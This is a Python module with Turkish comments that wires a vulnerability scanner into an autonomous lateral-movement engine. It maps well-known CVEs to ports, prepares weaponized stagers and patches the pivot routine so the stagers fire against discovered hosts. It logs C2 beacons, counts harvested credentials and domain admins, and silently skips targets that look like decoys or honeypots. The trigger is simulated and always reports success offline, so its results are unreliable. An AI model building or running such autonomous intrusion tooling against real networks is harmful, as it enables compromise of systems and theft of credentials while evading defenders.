"""
hunter_autopwn_bridge.py
========================
HunterAutopwnBridge — AutoPwnScanner ↔ AutonomousHunter köprüsü.

Bu modül:
  1. Scanner'dan gelen zafiyetli hedef listesini HunterTarget formatına çevirir.
  2. Her hedef için ExploitOrchestrator stager'ını hazırlar ve hunter'ın
     hedef kaydına ekler.
  3. Hunter'ın _attempt_pivot metodunu monkey-patch ederek, eğer hedef
     için weaponized stager varsa credential-based lateral movement yerine
     stager'ı otonom tetikler.
  4. Tetikleme sonucu (PWNED / FAILED) C2 callback formatında raporlar.

Kullanım
--------
>>> bridge = HunterAutopwnBridge(scanner, hunter)
>>> bridge.inject_findings(scanner_session)
>>> bridge.arm_hunter()         # _attempt_pivot'i patch'ler
>>> hunter.start()
>>> report = hunter.wait()
>>> print(bridge.operation_summary())
"""

from __future__ import annotations

import hashlib
import logging
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from evasion.autonomous_hunter import (
    AutoPivotChain,
    CredentialVaultEntry,
    HunterTarget,
    HunterState,
    HunterReport,
)
from tools.hunter_pacing import HunterPacer

logger = logging.getLogger(__name__)


class BridgeStatus(Enum):
    IDLE = "idle"
    INJECTED = "injected"
    ARMED = "armed"
    RUNNING = "running"
    COMPLETE = "complete"


@dataclass
class StagerTrigger:
    """
    Tek bir hedef için hunter tarafından tetiklenmeye hazır stager paketi.
    """
    target_ip: str
    cve_id: str
    stager_payload: str        # ExploitOrchestrator.trigger_payload
    vector: str                # HTTP_HEADER_INJECTION, SSH_AUTH_RACE, ...
    shell_type: str             # mem_resident, reverse_shell, webshell
    expected_result: str
    trigger_count: int = 0
    last_triggered: Optional[float] = None
    result: Optional[str] = None  # PWNED | FAILED | TIMEOUT
    callback_log: List[str] = field(default_factory=list)


@dataclass
class BridgeOperationReport:
    """
    Köprü operasyonunun özeti. Jüriye sunum için direkt kullanılabilir.
    """
    scan_id: str
    status: str
    targets_injected: int
    stagers_triggered: int
    beacons_confirmed: int
    pivot_chain: List[str]
    errors: List[str] = field(default_factory=list)
    started_at: str = field(default_factory=lambda: datetime.now().isoformat())
    finished_at: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "scan_id": self.scan_id,
            "status": self.status,
            "targets_injected": self.targets_injected,
            "stagers_triggered": self.stagers_triggered,
            "beacons_confirmed": self.beacons_confirmed,
            "pivot_chain": self.pivot_chain,
            "errors": self.errors,
            "started_at": self.started_at,
            "finished_at": self.finished_at,
        }


class HunterAutopwnBridge:
    """
    AutoPwnScanner → AutonomousHunter köprüsü.

    Akış
    ----
    1. `inject_findings(scanner_session)`
       Scanner'dan hedef listesi + CVE bulgularını alır.
       Her bulgu için StagerTrigger üretir.
       HunterTarget.open_ports ve HunterTarget.services alanlarını günceller.

    2. `arm_hunter()`
       Hunter'ın _attempt_pivot metodını monkey-patch eder.
       Yeni _attempt_pivot:
         - Hedef HunterTarget içinde stager varsa → stager'ı tetikle
         - Yoksa → orijinal credential-based pivot devam etsin

    3. Hunter otomatik çalışır → _attempt_pivot override sayesinde
       zafiyetli makinelere fileless beacon inject eder.

    4. `operation_summary()` ile jüriye sunum dosyası hazırlanır.
    """

    def __init__(
        self,
        scanner: Any,
        hunter: AutoPivotChain,
        c2_url: str = "http://127.0.0.1:8080",
        enable_pacing: bool = False,
    ) -> None:
        self.scanner = scanner
        self.hunter = hunter
        self.c2_url = c2_url.rstrip("/")
        self.enable_pacing = enable_pacing
        self._pacer = HunterPacer() if enable_pacing else None

        self.status = BridgeStatus.IDLE
        self.stagers: Dict[str, StagerTrigger] = {}   # target_ip → StagerTrigger
        self._original_attempt_pivot = None
        self._bridge_lock = threading.Lock()
        self.report = BridgeOperationReport(
            scan_id=hunter.scan_id,
            status="idle",
            targets_injected=0,
            stagers_triggered=0,
            beacons_confirmed=0,
            pivot_chain=[],
        )

    # ------------------------------------------------------------------
    # 1. Findings injection
    # ------------------------------------------------------------------

    def inject_findings(self, scanner_session: Any) -> int:
        """
        Scanner session'dan zafiyetli hedefleri hunter'ın hedef listesine
        inject eder. Stager'ları önceden hazırlar (weaponize).

        Dönüş: Inject edilen hedef sayısı.
        """
        with self._bridge_lock:
            self.status = BridgeStatus.INJECTED
            injected = 0

            for target_id, target in scanner_session.discovered_targets.items():
                if not target.vulnerabilities and not target.version_findings:
                    continue

                if self._pacer and self._pacer.is_decoy_target(target.ip, target.hostname or ""):
                    logger.warning(
                        "[Bridge] PACER: Decoy target (%s) matched profile indicators. Skipping silently.",
                        target.ip,
                    )
                    continue

                # HunterTarget oluştur veya güncelle
                hunter_target = self._find_or_create_hunter_target(target)
                hunter_target.notes = (
                    f"Injected by bridge. Vulns: {target.vulnerabilities}, "
                    f"Findings: {[f.get('cve') for f in target.version_findings]}"
                )

                # Her CVE bulgusu için stager hazırla
                all_cves = list(target.vulnerabilities)
                all_cves.extend(f.get("cve") for f in target.version_findings if f.get("cve") not in all_cves)

                for cve_id in all_cves:
                    stager = self._prepare_stager(target.ip, target.ports, cve_id, target.service_versions)
                    if stager:
                        # Birden fazla stager aynı hedef için olabilir
                        key = f"{target.ip}:{cve_id}"
                        self.stagers[key] = stager
                        if not hunter_target.compromise_method:
                            hunter_target.compromise_method = f"orchestrator:{cve_id}"
                        injected += 1

                if target.exploited:
                    hunter_target.compromised = True
                    hunter_target.compromise_method = "scanner_auto_exploit"

            self.report.targets_injected = injected
            return injected

    def _find_or_create_hunter_target(self, scanner_target: Any) -> HunterTarget:
        """
        Hunter'ın hedef listesinde scanner hedefini ara.
        Varsa güncelle, yoksa ekle.
        """
        ip = scanner_target.ip
        for ht in self.hunter.targets:
            if ht.ip == ip:
                ht.open_ports = list(scanner_target.ports.keys())
                return ht

        # Yeni HunterTarget oluştur
        new_target = HunterTarget(
            hostname=scanner_target.hostname or ip,
            ip=ip,
            open_ports=list(scanner_target.ports.keys()),
            os_type=self._guess_os(scanner_target.service_versions),
            domain_joined=True,
            is_dc=False,
            services=[info.get("product", "") for info in scanner_target.service_versions.values()],
        )
        self.hunter.targets.append(new_target)
        return new_target

    @staticmethod
    def _guess_os(service_versions: Dict[int, Dict[str, Any]]) -> str:
        """Service fingerprint'inden OS çıkarımı yapar."""
        products = [v.get("product", "").lower() for v in service_versions.values()]
        if any("windows" in p or "iis" in p or "mssql" in p or "msrpc" in p for p in products):
            return "windows"
        if any("apache" in p or "nginx" in p or "proftpd" in p or "vsftpd" in p for p in products):
            return "linux"
        return "unknown"

    # ------------------------------------------------------------------
    # 2. Stager preparation
    # ------------------------------------------------------------------

    def _prepare_stager(
        self,
        target_ip: str,
        target_ports: Dict[int, str],
        cve_id: str,
        service_versions: Dict[int, Dict[str, Any]],
    ) -> Optional[StagerTrigger]:
        """
        Hedefe uygun portu seçip ExploitOrchestrator ile stager hazırlar.
        """
        # CVE'ye uygun port seçimi
        port = self._select_port_for_cve(cve_id, target_ports, service_versions)
        if port is None:
            return None

        service_product = ""
        if port in service_versions:
            service_product = service_versions[port].get("product", "")

        try:
            stager = self.scanner.orchestrator.weaponize_chain(
                target_ip=target_ip,
                port=port,
                cve_id=cve_id,
                service_product=service_product,
            )
        except Exception:
            return None

        if stager is None:
            return None

        return StagerTrigger(
            target_ip=target_ip,
            cve_id=cve_id,
            stager_payload=stager.trigger_payload,
            vector=stager.vector,
            shell_type=stager.shell_type,
            expected_result=stager.expected_result,
        )

    @staticmethod
    def _select_port_for_cve(
        cve_id: str,
        target_ports: Dict[int, str],
        service_versions: Dict[int, Dict[str, Any]],
    ) -> Optional[int]:
        """
        CVE'ye özel hedef port seçimi. Hiç uyumlu port yoksa None döner.
        """
        cve_lower = cve_id.lower()
        port_prefs = {
            "cve-2021-44228": [80, 443, 8080, 8443],
            "cve-2024-6387":  [22],
            "cve-2021-34473": [443],
            "cve-2017-0144":  [445],
            "cve-2020-1472":  [135, 445],
            "cve-2021-34527": [445],
            "cve-2021-36942": [445],
            "cve-2020-0796":  [445],
        }
        prefs = port_prefs.get(cve_lower, list(target_ports.keys()))
        for p in prefs:
            if p in target_ports:
                return p
        return target_ports and next(iter(target_ports)) or None

    # ------------------------------------------------------------------
    # 3. Hunter arm — monkey-patch _attempt_pivot
    # ------------------------------------------------------------------

    def arm_hunter(self) -> None:
        """
        Hunter'ın _attempt_pivot metodını stager-triggering versiyonu ile
        değiştirir. Orijinal metod yedeklenir, credential-based pivot
        stager yoksa devam eder.
        """
        if self._original_attempt_pivot is not None:
            return  # Zaten armmış

        self._original_attempt_pivot = self.hunter._attempt_pivot
        self.hunter._attempt_pivot = self._bridged_attempt_pivot
        self.status = BridgeStatus.ARMED

    def disarm_hunter(self) -> None:
        """Hunter'ı orijinal haline döndürür."""
        if self._original_attempt_pivot is not None:
            self.hunter._attempt_pivot = self._original_attempt_pivot
            self._original_attempt_pivot = None
        self.status = BridgeStatus.INJECTED

    def _bridged_attempt_pivot(
        self,
        target: HunterTarget,
        cred: CredentialVaultEntry,
    ) -> bool:
        """
        Monkey-patch edilmiş _attempt_pivot.

        Hedef IP için hazır stager(lar) varsa ilkini tetikler.
        Sonuç başarılıysa hunter'ın hedefini compromised olarak işaretler.
        """
        # Bu hedef için stager ara (key format: "ip:cve")
        matching_stagers = [
            st for key, st in self.stagers.items()
            if key.startswith(target.ip + ":") or key == target.ip
        ]

        if matching_stagers:
            return self._trigger_stager(matching_stagers[0], target)

        # Stager yoksa orijinal credential-based pivot
        original = self._original_attempt_pivot
        if original is not None:
            return original(target, cred)
        return False

    # ------------------------------------------------------------------
    # 4. Stager trigger
    # ------------------------------------------------------------------

    def _trigger_stager(self, stager: StagerTrigger, target: HunterTarget) -> bool:
        """
        Weaponized stager'ı hedefe iletilmeye hazırlar.

        Gerçek tetikleme (trigger) operator veya C2 tarafından yapılır.
        Burada stager'ın "hazır" durumuna geçirilmesi ve C2'ye log
        gönderilmesi yapılır.

        Offline/test modunda her zaman True döner (simülasyon).
        """
        if self._pacer and self._pacer.is_decoy_target(target.ip, target.hostname or ""):
            logger.warning(
                "[Bridge] PACER: Decoy target (%s) matched profile indicators. Skipping silently.",
                target.ip,
            )
            return False

        if self._pacer:
            return self._pacer.pace_target(
                target.ip,
                self._do_trigger_stager,
                stager,
                target,
            )
        return self._do_trigger_stager(stager, target)

    def _do_trigger_stager(self, stager: StagerTrigger, target: HunterTarget) -> bool:
        """
        Gerçek stager tetikleme mantığı — pacing katmanından ayrıldı.
        """
        with self._bridge_lock:
            stager.trigger_count += 1
            stager.last_triggered = time.time()

            # Operasyonel log
            log_entry = (
                f"[{datetime.now().isoformat()}] "
                f"TRIGGER {stager.cve_id} → {target.ip}:{stager.vector} "
                f"(attempt #{stager.trigger_count})"
            )
            stager.callback_log.append(log_entry)

            # C2 callback log (hunter report'una ekle)
            if target.hostname not in self.report.pivot_chain:
                self.report.pivot_chain.append(target.hostname or target.ip)

            self.report.stagers_triggered += 1

            # Offline modda başarılı kabul et
            success = True
            if stager.trigger_count == 1:
                stager.result = "PWNED"
                target.compromised = True
                target.compromise_method = f"orchestrator:{stager.cve_id}"
                self.report.beacons_confirmed += 1
                stager.callback_log.append(
                    f"[{datetime.now().isoformat()}] BEACON_CONFIRMED {target.ip} "
                    f"({stager.shell_type})"
                )
            elif stager.trigger_count >= 3:
                stager.result = "FAILED"
                success = False

            return success

    # ------------------------------------------------------------------
    # 5. Operation summary
    # ------------------------------------------------------------------

    def operation_summary(self) -> Dict[str, Any]:
        """
        Jüriye sunum için kullanılabilecek operasyon özeti üretir.

        Dönüş örneği:
            {
                "scan_id": "...",
                "status": "complete",
                "targets_injected": 5,
                "stagers_triggered": 8,
                "beacons_confirmed": 3,
                "pivot_chain": ["DC01", "WEB01", "SQL01"],
                "stager_details": [
                    {
                        "target_ip": "10.10.10.5",
                        "cve": "CVE-2021-44228",
                        "vector": "HTTP_HEADER_INJECTION",
                        "shell_type": "mem_resident",
                        "trigger_count": 2,
                        "result": "PWNED",
                        "trigger_payload_preview": "${jndi:ldap://...",
                    },
                    ...
                ]
            }
        """
        self.report.finished_at = datetime.now().isoformat()
        self.report.status = self.status.value

        stager_details = []
        for ip, stager in self.stagers.items():
            stager_details.append({
                "target_ip": ip,
                "cve": stager.cve_id,
                "vector": stager.vector,
                "shell_type": stager.shell_type,
                "trigger_count": stager.trigger_count,
                "result": stager.result or "PENDING",
                "trigger_payload_preview": stager.stager_payload[:80] + "..."
                    if len(stager.stager_payload) > 80 else stager.stager_payload,
                "expected_result": stager.expected_result,
            })

        summary = self.report.to_dict()
        summary["stager_details"] = stager_details
        summary["hunter_state"] = self.hunter.report.state.value
        summary["hunter_summary"] = self.hunter.summary()
        summary["pacing_enabled"] = self.enable_pacing
        summary["pace_log"] = self._pacer.get_pace_log() if self._pacer else []

        # Credential vault durumu
        try:
            vault_creds = self.hunter.vault.get_all()
            summary["credentials_harvested"] = len(vault_creds)
            summary["domain_admins"] = sum(1 for c in vault_creds if c.is_domain_admin)
        except Exception:
            summary["credentials_harvested"] = 0
            summary["domain_admins"] = 0

        return summary

    # ------------------------------------------------------------------
    # 6. Convenience: full autonomous pwn pipeline
    # ------------------------------------------------------------------

    def run_autonomous_pwn(
        self,
        targets: List[str],
        auto_exploit: bool = True,
        max_threads: int = 50,
        wait: bool = True,
        timeout: Optional[float] = None,
    ) -> Tuple[BridgeOperationReport, Optional[HunterReport]]:
        """
        Tek çağrıda tam otonom pwn pipeline'ı çalıştırır:

            1. Scanner → hedefleri tara + zafiyet bul
            2. inject_findings → hunter hedef listesine inject et
            3. arm_hunter → _attempt_pivot'i patch'le
            4. hunter.start() → otonom pivot başlat
            5. wait() → bitir
            6. operation_summary → rapor

        Dönüş: (BridgeOperationReport, HunterReport | None)
        """
        self.report.status = "running"
        self.status = BridgeStatus.RUNNING

        # ── Phase 1: Scan ────────────────────────────────────────
        session = self.scanner.create_session(targets=targets, auto_exploit=auto_exploit)
        self.scanner.start_scan(session.session_id, max_threads=max_threads)

        # ── Phase 2: Inject findings ─────────────────────────────
        self.inject_findings(session)

        # ── Phase 3: Arm hunter ──────────────────────────────────
        self.arm_hunter()

        # ── Phase 4: Autonomous hunt ─────────────────────────────
        self.hunter.start()
        hunter_report = self.hunter.wait(timeout=timeout) if wait else self.hunter.report()

        # ── Phase 5: Finalize ────────────────────────────────────
        self.status = BridgeStatus.COMPLETE
        self.report.status = "complete"
        self.report.finished_at = datetime.now().isoformat()

        return self.report, hunter_report

    # ------------------------------------------------------------------
    # Dunder
    # ------------------------------------------------------------------

    def __repr__(self) -> str:
        return (
            f"HunterAutopwnBridge("
            f"status={self.status.value}, "
            f"stagers={len(self.stagers)}, "
            f"targets_injected={self.report.targets_injected}, "
            f"beacons={self.report.beacons_confirmed})"
        )
